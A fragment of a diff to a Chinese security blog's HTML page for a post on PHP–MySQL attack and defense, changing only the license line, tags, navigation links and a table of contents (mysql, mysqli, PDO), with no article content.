+  <p><span>原始链接:</span><a href="/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/" title="php mysql攻防">https://lockcy.github.io/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lockcy.github.io/2022/06/14/php-mysql%E6%94%BB%E9%98%B2/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -333,6 +324,7 @@
           
           <div class="post-tags">
               <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/php/" rel="tag"># php</a>
           </div>
 
         
@@ -341,13 +333,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/01/10/twisted%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/" rel="prev" title="twisted历史漏洞">
-      <i class="fa fa-chevron-left"></i> twisted历史漏洞
+    <a href="/2022/05/16/%E7%A7%91%E6%B1%9Bcms9-0%E9%80%9A%E7%94%A8%E7%89%88%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="prev" title="科汛cms9.0通用版源码审计">
+      <i class="fa fa-chevron-left"></i> 科汛cms9.0通用版源码审计
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2022/02/16/hackmyvm%E9%9D%B6%E6%9C%BAmessages/" rel="next" title="hackmyvm靶机messages">
-      hackmyvm靶机messages <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -405,6 +394,7 @@
       </ul>
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text"> mysql （5.5之前）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text"> mysqli </span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text"> PDO </span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
